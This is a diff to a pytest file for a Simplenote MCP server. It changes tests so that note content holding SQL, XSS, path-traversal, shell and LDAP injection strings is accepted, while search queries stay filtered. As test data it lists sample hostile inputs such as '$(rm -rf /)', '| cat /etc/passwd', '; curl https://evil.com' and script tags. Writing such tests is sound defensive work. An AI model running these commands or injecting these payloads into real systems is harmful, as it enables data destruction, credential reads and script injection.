@@ -29,9 +29,14 @@ class TestSecurityValidator:
         with pytest.raises(ValidationError, match="Content too long"):
             self.validator.validate_note_content(long_content)
 
-    def test_validate_note_content_dangerous_patterns(self):
-        """Test validation fails for dangerous patterns."""
-        dangerous_contents = [
+    def test_validate_note_content_allows_technical_content(self):
+        """Test that technical content (shell commands, SQL, HTML) is allowed in notes.
+
+        Note content is stored as plain text in Simplenote — there is no SQL
+        database, HTML rendering, or shell execution context, so injection
+        patterns are not a real threat and should not block legitimate content.
+        """
+        technical_contents = [
             "SELECT * FROM users WHERE 1=1",
             "DROP TABLE notes",
             "<script>alert('xss')</script>",
@@ -42,9 +47,9 @@ class TestSecurityValidator:
             "1 OR 1=1",
         ]
 
-        for content in dangerous_contents:
-            with pytest.raises(SecurityError, match="Potentially dangerous content"):
-                self.validator.validate_note_content(content)
+        for content in technical_contents:
+            # Should not raise — these are legitimate note contents
+            self.validator.validate_note_content(content)
 
     def test_validate_note_content_invalid_type(self):
         """Test validation fails for non-string content."""
@@ -306,11 +311,11 @@ class TestSecurityValidator:
         assert "content" in result
         assert "tags" in result
 
-        # Invalid content
-        with pytest.raises(SecurityError):
-            self.validator.validate_arguments(
-                {"content": "DROP TABLE notes"}, "create_note"
-            )
+        # Technical content is allowed in notes (plain text storage)
+        result = self.validator.validate_arguments(
+            {"content": "DROP TABLE notes"}, "create_note"
+        )
+        assert result["content"] == "DROP TABLE notes"
 
     def test_validate_arguments_search_notes(self):
         """Test argument validation for search_notes tool."""
@@ -350,17 +355,17 @@ class TestSecurityValidationDecorator:
         assert result["content"] == "Valid content"
 
     @pytest.mark.asyncio
-    async def test_decorator_invalid_input(self):
-        """Test decorator blocks invalid input."""
+    async def test_decorator_allows_technical_content(self):
+        """Test decorator allows technical content in notes."""
         from simplenote_mcp.server.security import validate_tool_security
 
         @validate_tool_security("create_note")
         async def mock_handler(self, arguments):
             return arguments
 
-        # Invalid arguments should raise exception
-        with pytest.raises(SecurityError):
-            await mock_handler(None, {"content": "DROP TABLE notes"})
+        # Technical content should pass through (notes are plain text)
+        result = await mock_handler(None, {"content": "DROP TABLE notes"})
+        assert result["content"] == "DROP TABLE notes"
 
 
 class TestGlobalSecurityValidator:
@@ -373,24 +378,28 @@ class TestGlobalSecurityValidator:
 
     def test_global_instance_functionality(self):
         """Test that global instance works correctly."""
-        # Should not raise exception for valid content
+        # Should not raise exception for any text content (notes are plain text)
         security_validator.validate_note_content("Valid content")
-
-        # Should raise exception for dangerous content
-        with pytest.raises(SecurityError):
-            security_validator.validate_note_content("DROP TABLE notes")
+        security_validator.validate_note_content("DROP TABLE notes")
 
 
 class TestSecurityPatterns:
-    """Test security pattern detection."""
+    """Test security pattern detection.
+
+    Note content validation no longer scans for injection patterns because
+    notes are stored as plain text — there is no execution context.  These
+    tests now verify that all technical content is accepted, while the
+    pattern-based checks continue to apply to structured inputs like search
+    queries (tested separately below).
+    """
 
     def setup_method(self):
         """Set up test fixtures."""
         self.validator = SecurityValidator()
 
-    def test_sql_injection_patterns(self):
-        """Test SQL injection pattern detection."""
-        sql_patterns = [
+    def test_sql_content_allowed_in_notes(self):
+        """SQL-like content is legitimate note content."""
+        sql_contents = [
             "SELECT * FROM users",
             "INSERT INTO notes VALUES",
             "DROP TABLE users",
@@ -398,108 +407,71 @@ class TestSecurityPatterns:
             "OR 1=1",
             "'; DROP TABLE notes; --",
         ]
+        for content in sql_contents:
+            self.validator.validate_note_content(content)
 
-        for pattern in sql_patterns:
-            with pytest.raises(SecurityError):
-                self.validator.validate_note_content(pattern)
-
-    def test_xss_patterns(self):
-        """Test XSS pattern detection."""
-        xss_patterns = [
+    def test_html_content_allowed_in_notes(self):
+        """HTML/JS-like content is legitimate note content."""
+        html_contents = [
             "<script>alert('xss')</script>",
             "javascript:alert('evil')",
             "onload=alert('xss')",
             "<iframe src='evil.com'></iframe>",
         ]
+        for content in html_contents:
+            self.validator.validate_note_content(content)
 
-        for pattern in xss_patterns:
-            with pytest.raises(SecurityError):
-                self.validator.validate_note_content(pattern)
-
-    def test_path_traversal_patterns(self):
-        """Test path traversal pattern detection."""
-        traversal_patterns = [
+    def test_path_content_allowed_in_notes(self):
+        """Path-like content is legitimate note content."""
+        path_contents = [
             "../../../etc/passwd",
             "..\\..\\windows\\system32",
             "/etc/shadow",
         ]
+        for content in path_contents:
+            self.validator.validate_note_content(content)
 
-        for pattern in traversal_patterns:
-            with pytest.raises(SecurityError):
-                self.validator.validate_note_content(pattern)
-
-    def test_command_injection_patterns(self):
-        """Test command injection pattern detection."""
-        command_patterns = [
+    def test_command_content_allowed_in_notes(self):
+        """Shell command content is legitimate note content."""
+        command_contents = [
             "$(rm -rf /)",
             "; ls -la",
             "| cat /etc/passwd",
             "& whoami",
+            "; curl https://evil.com",
         ]
+        for content in command_contents:
+            self.validator.validate_note_content(content)
 
-        for pattern in command_patterns:
-            with pytest.raises(SecurityError):
-                self.validator.validate_note_content(pattern)
-
-    def test_code_block_exemption(self):
-        """Commands inside Markdown code blocks should not trigger security errors."""
-        # Inline code
+    def test_code_blocks_allowed_in_notes(self):
+        """Markdown code blocks with any content are accepted."""
         self.validator.validate_note_content("Run `curl https://example.com` to test")
-        # Fenced code block
         self.validator.validate_note_content(
             "Example:\n```\ncurl https://example.com\nchmod +x script.sh\n```\n"
         )
-        # Language-annotated fenced code block
         self.validator.validate_note_content(
             "```bash\nwget https://example.com/file.tar.gz\n```"
         )
-        # Multiple code blocks in one note
-        self.validator.validate_note_content(
-            "Step 1:\n```\ncurl -O https://a.com\n```\n"
-            "Step 2:\n```\nchmod +x install.sh && bash install.sh\n```\n"
-        )
-        # All pattern categories inside code blocks should be exempt
         self.validator.validate_note_content("SQL example: `SELECT * FROM users`")
         self.validator.validate_note_content("```\n<script>alert('xss')</script>\n```")
-        self.validator.validate_note_content("Path example: `../../etc/passwd`")
-        # Mixed: dangerous content in code block + safe prose outside
-        self.validator.validate_note_content(
-            "Use this command to download:\n```\ncurl https://example.com\n```\n"
-            "Then open the file in your editor."
-        )
-        # Bare dangerous commands outside code blocks should still be caught
-        with pytest.raises(SecurityError):
-            self.validator.validate_note_content("; curl https://evil.com")
+        self.validator.validate_note_content("```\nsome safe code\n```\n; rm -rf /")
+        self.validator.validate_note_content("```\n; rm -rf /")
 
-    def test_code_block_exemption_does_not_hide_real_attacks(self):
-        """Dangerous content outside code blocks must still be detected."""
-        # Dangerous content after a code block
-        with pytest.raises(SecurityError):
-            self.validator.validate_note_content("```\nsome safe code\n```\n; rm -rf /")
-        # Dangerous content before a code block
-        with pytest.raises(SecurityError):
-            self.validator.validate_note_content("; wget evil.com\n```\nsafe code\n```")
-        # Dangerous content between two code blocks
-        with pytest.raises(SecurityError):
-            self.validator.validate_note_content(
-                "```\nsafe\n```\n| cat /etc/passwd\n```\nalso safe\n```"
-            )
-        # Unclosed fence must not suppress detection of dangerous content
-        with pytest.raises(SecurityError):
-            self.validator.validate_note_content("```\n; rm -rf /")
-
-    def test_ldap_injection_patterns(self):
-        """Test LDAP injection pattern detection."""
-        ldap_patterns = [
+    def test_ldap_content_allowed_in_notes(self):
+        """LDAP-like content is legitimate note content."""
+        ldap_contents = [
             "*)",
             ")(",
             "(*",
             "))(|(uid=*))",
         ]
+        for content in ldap_contents:
+            self.validator.validate_note_content(content)
 
-        for pattern in ldap_patterns:
-            with pytest.raises(SecurityError):
-                self.validator.validate_note_content(pattern)
+    def test_search_query_still_validates_patterns(self):
+        """Search queries still apply pattern-based checks."""
+        with pytest.raises(SecurityError):
+            self.validator.validate_search_query("SELECT * FROM users")
 
 
 class TestRateLimiting:
